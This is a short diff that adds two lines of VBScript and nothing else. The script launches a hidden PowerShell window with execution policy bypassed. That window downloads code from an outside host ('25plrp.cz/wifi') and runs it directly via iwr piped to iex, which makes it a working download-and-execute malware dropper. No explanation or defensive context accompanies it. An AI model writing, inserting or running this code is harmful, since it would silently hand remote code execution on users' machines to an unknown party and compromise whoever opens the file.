@@ -1,0 +1,2 @@
+Set objShell = CreateObject("Wscript.Shell")
+objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command iwr '25plrp.cz/wifi' ^| iex", 0, True
